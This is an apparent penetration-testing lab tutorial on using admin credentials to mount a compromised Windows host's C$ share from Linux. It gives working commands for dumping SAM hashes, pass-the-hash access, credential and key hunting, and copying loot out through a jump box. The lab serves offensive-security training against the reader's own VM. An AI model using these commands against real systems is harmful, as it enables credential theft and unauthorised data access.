# Lab: Mounting Windows Shares from Linux After Compromising a Host

## Objective

After compromising a Windows machine, access its files by mounting its shares on your Kali machine or a Linux jump box. This is a critical post-exploitation skill — Windows shares expose the entire filesystem to attackers who have admin credentials.

## What You'll Practice

- Enumerating SMB shares from Linux
- Mounting Windows shares with `mount.cifs`
- Accessing the entire C: drive via `C$`
- Mounting shares on a jump box for pivoting
- Using smbclient for quick file access
- Understanding admin shares and their purpose

## Prerequisites

- Your Windows 11 VM running with a known admin account
- Kali Linux (attacker)
- Debian or CentOS as a jump box (optional — for the pivoting scenario)

---

## Understanding Windows Admin Shares

Every Windows machine with file sharing enabled has **hidden administrative shares** that only administrators can access:

| Share | What it maps to | Who can access it |
|---|---|---|
| `C$` | The entire C: drive | Administrators only |
| `D$` | The entire D: drive (if exists) | Administrators only |
| `ADMIN$` | C:\Windows | Administrators only |
| `IPC$` | Inter-process communication | Used for SMB sessions (not a real share) |

These exist by default on all Windows machines. They don't show up when you list shares normally — they're hidden (the `$` at the end means hidden). But if you know they exist AND have admin credentials, you can access the entire filesystem.

**Why this matters for pentesting:** After compromising a Windows host, mounting `C$` gives you access to every file on the machine — SAM database, user profiles, documents, config files, flags — without needing RDP or a shell.

---

## Part 1: Set Up the Windows Target

### On your Windows 11 VM

**Step 1: Make sure file sharing is enabled**

1. Open **Settings → Network & internet → Advanced network settings → Advanced sharing settings**
2. Under your current profile (Private or Public), enable **File and printer sharing**
3. Under **All networks**, enable **Turn off password protected sharing** (for easier lab testing — in real life this stays ON)

Or via PowerShell (run as Administrator):

```powershell
# Enable file sharing on the firewall
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True

# Verify SMB is accessible
Get-SmbServerConfiguration | Select EnableSMB2Protocol
```

**Step 2: Verify your admin account**

```cmd
net user administrator
```

If the Administrator account is disabled:

```cmd
net user administrator /active:yes
net user administrator YourP@ssw0rd!
```

Or use whatever local admin account you have. Note the username and password.

**Step 3: Create some files worth finding**

```cmd
mkdir C:\SensitiveData
echo "Internal database credentials: dbadmin / Pr0dDB2026!" > C:\SensitiveData\creds.txt
echo "FLAG{windows_share_mounted}" > C:\SensitiveData\flag.txt
echo "Customer SSN list: [REDACTED]" > C:\SensitiveData\customers.txt

mkdir C:\Users\Public\Documents\IT
echo "VPN password: vpnAccess2026!" > C:\Users\Public\Documents\IT\vpn_config.txt
```

**Step 4: Verify SMB is accessible from Kali**

From Kali:
```bash
# Check if port 445 is open
nmap -p 445 WINDOWS_IP

# Try to list shares
smbclient -L //WINDOWS_IP -U administrator
# Enter the password when prompted
```

You should see the default shares (C$, ADMIN$, IPC$) plus any custom shares.

---

## Part 2: Enumerate Shares from Kali

### List available shares

```bash
# smbclient — interactive
smbclient -L //WINDOWS_IP -U administrator
# Enter password
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Users           Disk
```

```bash
# CrackMapExec — shows permissions
crackmapexec smb WINDOWS_IP -u administrator -p 'YourP@ssw0rd!' --shares
```

**Output:**

```
SMB   WINDOWS_IP  445  WIN11  [+] WIN11\administrator:YourP@ssw0rd! (Pwn3d!)
SMB   WINDOWS_IP  445  WIN11  [*] Enumerated shares
SMB   WINDOWS_IP  445  WIN11  Share     Permissions    Remark
SMB   WINDOWS_IP  445  WIN11  -----     -----------    ------
SMB   WINDOWS_IP  445  WIN11  ADMIN$    READ,WRITE     Remote Admin
SMB   WINDOWS_IP  445  WIN11  C$        READ,WRITE     Default share
SMB   WINDOWS_IP  445  WIN11  IPC$                     Remote IPC
SMB   WINDOWS_IP  445  WIN11  Users     READ,WRITE
```

`READ,WRITE` on `C$` means you have full access to the entire drive.

### Quick file access with smbclient

```bash
# Connect to C$ (the entire C: drive)
smbclient //WINDOWS_IP/C$ -U administrator
# Enter password

# You're now browsing the C: drive
smb: \> ls
smb: \> cd SensitiveData
smb: \> ls
smb: \> get creds.txt
smb: \> get flag.txt
smb: \> cd \Users\Public\Documents\IT
smb: \> get vpn_config.txt
smb: \> exit
```

```bash
# Read the downloaded files
cat creds.txt
cat flag.txt
cat vpn_config.txt
```

**smbclient is good for quick grabs** — connect, download a few files, disconnect. But if you need to browse extensively, search for files, or use standard Linux tools, mounting is better.

---

## Part 3: Mount the Windows Share on Kali

### Install CIFS utilities (if not already installed)

```bash
sudo apt install cifs-utils -y
```

### Mount the entire C: drive

```bash
# Create a mount point
sudo mkdir -p /mnt/windows

# Mount C$
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/windows -o username=administrator,password='YourP@ssw0rd!'
```

**Breaking this down:**

| Part | What it does |
|---|---|
| `mount` | The mount command |
| `-t cifs` | Filesystem type is CIFS (Common Internet File System — modern SMB) |
| `//WINDOWS_IP/C$` | The remote share (UNC path) |
| `/mnt/windows` | Where it appears on your local filesystem |
| `-o username=...` | Mount options — credentials |

### Verify the mount worked

```bash
# Check it's mounted
mount | grep cifs
# or
df -h | grep windows

# Browse the Windows C: drive as if it were a local folder
ls /mnt/windows/
ls /mnt/windows/Users/
ls /mnt/windows/SensitiveData/
cat /mnt/windows/SensitiveData/flag.txt
cat /mnt/windows/SensitiveData/creds.txt
```

You're now browsing the Windows filesystem from your Kali terminal. Every Linux command works:

```bash
# Search for files containing "password"
grep -r "password" /mnt/windows/Users/ 2>/dev/null

# Find all text files
find /mnt/windows/ -name "*.txt" 2>/dev/null

# Find recently modified files
find /mnt/windows/Users/ -mtime -7 -type f 2>/dev/null

# Look for SAM database backups
find /mnt/windows/ -name "SAM" -o -name "SYSTEM" 2>/dev/null

# Search for config files with credentials
grep -rli "password\|passwd\|credential\|secret\|key" /mnt/windows/Users/ 2>/dev/null
```

### Mount with a credentials file (cleaner)

Instead of putting the password on the command line (visible in `ps aux`):

```bash
# Create a credentials file
cat << 'EOF' | sudo tee /root/.smbcreds
username=administrator
password=YourP@ssw0rd!
domain=WORKGROUP
EOF

sudo chmod 600 /root/.smbcreds

# Mount using the credentials file
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/windows -o credentials=/root/.smbcreds
```

### Mount options you should know

```bash
# Read-only mount (safer — can't accidentally modify files)
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/windows -o username=admin,password=pass,ro

# Specify SMB version (if the default doesn't work)
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/windows -o username=admin,password=pass,vers=2.0
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/windows -o username=admin,password=pass,vers=3.0

# Mount as a specific local user (so your non-root user can access)
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/windows -o username=admin,password=pass,uid=$(id -u),gid=$(id -g)
```

### Unmount when done

```bash
sudo umount /mnt/windows
```

If it says "target is busy":

```bash
# Force unmount
sudo umount -f /mnt/windows

# Or find what's using it
lsof +f -- /mnt/windows
# Close whatever process is using it, then unmount
```

---

## Part 4: Mount on a Jump Box (Pivoting Scenario)

### The scenario

```
Kali (192.168.244.129)
    │
    │ You compromised Windows first, got admin creds
    │
Debian jump box (192.168.244.132)
    │
    │ Debian can reach Windows but you want to browse files from Debian
    ↓
Windows 11 (192.168.244.xxx)
```

You're SSH'd into Debian and want to mount the Windows share FROM Debian (not from Kali). Maybe Kali can't reach Windows directly, or you want to use Debian as a staging area.

### On Debian (the jump box)

```bash
# Install CIFS utilities
sudo apt install cifs-utils -y

# Create mount point
sudo mkdir -p /mnt/win_target

# Mount the Windows share
sudo mount -t cifs //WINDOWS_IP/C$ /mnt/win_target -o username=administrator,password='YourP@ssw0rd!'

# Browse from Debian
ls /mnt/win_target/Users/
cat /mnt/win_target/SensitiveData/flag.txt

# Search for interesting files
grep -rli "password" /mnt/win_target/Users/ 2>/dev/null
find /mnt/win_target/ -name "*.kdbx" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
```

### Copy files from Windows through the jump box to Kali

```bash
# From Kali — copy a file from the mounted share on Debian
scp user@192.168.244.132:/mnt/win_target/SensitiveData/creds.txt ./

# Copy a whole directory
scp -r user@192.168.244.132:/mnt/win_target/Users/admin/Desktop/ ./desktop_loot/
```

### Make it persistent with fstab (optional — for your lab)

```bash
# Add to /etc/fstab so it mounts on boot
echo "//WINDOWS_IP/C$ /mnt/win_target cifs credentials=/root/.smbcreds,_netdev 0 0" | sudo tee -a /etc/fstab
```

`_netdev` tells the system to wait for network before mounting. Remove the line when you're done practicing.

---

## Part 5: Using impacket-smbclient (alternative — no mount needed)

Impacket's smbclient works similarly but doesn't require mounting:

```bash
# Connect
impacket-smbclient administrator:'YourP@ssw0rd!'@WINDOWS_IP

# List shares
# shares

# Use a share
# use C$

# Browse
# ls
# cd Users
# cd administrator
# cd Desktop
# get proof.txt

# Upload a file
# put linpeas.exe
```

### With a hash instead of a password (Pass the Hash)

```bash
impacket-smbclient administrator@WINDOWS_IP -hashes aad3b435b51404ee:NTLM_HASH_HERE
```

This is exactly what you'd do after dumping hashes from another machine — access the Windows filesystem using the hash without knowing the password.

---

## Part 6: Post-Exploitation File Hunting

After mounting the Windows share, here's what to look for:

```bash
MOUNT=/mnt/windows

# SAM and SYSTEM files (crack for local password hashes)
find $MOUNT -name "SAM" -o -name "SYSTEM" -o -name "SECURITY" 2>/dev/null
cp $MOUNT/Windows/System32/config/SAM ./
cp $MOUNT/Windows/System32/config/SYSTEM ./
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# OSCP flags
find $MOUNT -name "local.txt" -o -name "proof.txt" 2>/dev/null

# PowerShell history (often contains passwords)
find $MOUNT/Users/ -path "*/PSReadLine/ConsoleHost_history.txt" 2>/dev/null
cat "$MOUNT/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt" 2>/dev/null

# Saved credentials and configs
find $MOUNT -name "web.config" -o -name "Unattend.xml" -o -name "unattend.xml" 2>/dev/null
find $MOUNT -name "*.kdbx" 2>/dev/null                    # KeePass databases
find $MOUNT -name "*.rdg" -o -name "*.rdp" 2>/dev/null    # RDP saved connections

# Search for passwords in text files
grep -rli "password\|credential\|secret" $MOUNT/Users/ 2>/dev/null | head -20

# SSH keys
find $MOUNT/Users/ -name "id_rsa" -o -name "*.ppk" 2>/dev/null
```

---

## Cleanup

```bash
# Unmount
sudo umount /mnt/windows
sudo umount /mnt/win_target

# Remove mount points
sudo rmdir /mnt/windows /mnt/win_target

# Remove credentials file
sudo rm /root/.smbcreds

# On Windows — remove test files
rmdir /s /q C:\SensitiveData
del C:\Users\Public\Documents\IT\vpn_config.txt
```

---

## Key Takeaways

```
ENUMERATION:
  smbclient -L //TARGET -U user              List shares
  crackmapexec smb TARGET -u user -p pass --shares    Shares + permissions

QUICK ACCESS:
  smbclient //TARGET/C$ -U admin             Interactive browse
  impacket-smbclient admin:pass@TARGET        Impacket version

MOUNTING (full filesystem access):
  sudo mount -t cifs //TARGET/C$ /mnt/win -o username=admin,password=pass

POST-EXPLOITATION:
  grep -rli "password" /mnt/win/Users/        Hunt for credentials
  find /mnt/win -name "SAM" 2>/dev/null       Find password databases
  cat /mnt/win/Users/*/AppData/.../ConsoleHost_history.txt   PowerShell history

PIVOTING:
  Mount on the jump box, SCP files to Kali
  Or use impacket-smbclient with Pass the Hash
```
